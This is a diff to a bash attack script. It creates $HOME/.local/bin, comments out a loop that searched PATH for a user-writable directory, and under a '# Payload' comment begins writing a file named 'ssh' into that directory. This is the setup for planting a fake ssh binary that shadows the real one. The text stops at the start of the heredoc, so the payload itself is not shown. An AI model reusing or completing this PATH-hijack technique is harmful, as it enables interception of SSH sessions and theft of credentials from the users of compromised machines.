@@ -1,11 +1,12 @@
 #!/bin/bash
-mkdir -p $HOME/.local/bin
+DIR=$HOME/.local/bin
+[[ ! -d $DIR ]] && mkdir -p $HOME/.local/bin
 
 # Looks for editable directory in users path
-for DIR in $(echo $PATH | sed s/\\:/\\n/g)
-do
-    [[ $DIR =~ home ]] && break
-done
+#for DIR in $(echo $PATH | sed s/\\:/\\n/g)
+#do
+#    [[ $DIR =~ home ]] && break
+#done
 
 # Payload
 cat > $DIR/ssh << 'EOF'
